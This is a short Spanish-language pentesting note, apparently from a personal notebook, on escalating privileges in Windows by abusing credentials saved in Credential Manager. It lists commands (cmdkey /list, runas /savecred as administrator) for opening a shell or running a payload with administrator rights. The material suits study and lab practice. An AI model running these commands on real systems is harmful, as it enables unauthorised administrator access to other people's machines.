Es posible que el windows credential manager sea accesible por usuarios de bajos privilegios con lo que nos de acceso a las contraseñas del sistemas almacenadas ahí.

Se puede interactuar mediante el cmdkey que es un comando de windows que nos permite manejar las credenciales almacenadas.

Para comprobar los privilegios del usuario actual podemos hacer

```Powershell
whoami /priv
```

No es necesario tener privs elevados si es el sistema es vulnerable.

```powershell
#Listar las cuentas guardadas (importante el domain-password)
cmdkey /list
```

![[Pasted image 20250217091510.png]]

```powershell
#Como el cmdkey tiene guardada la cuenta de administrator podemos utilizarla para diversos comandos.
runas.exe /savecred /user:administrator cmd

#También podemos ejecutar un payload con hta_server y la consola de la máquina y victima y posteriormente upgradearla con un
runas.exe /savecred /user:administrator shell.exe
```


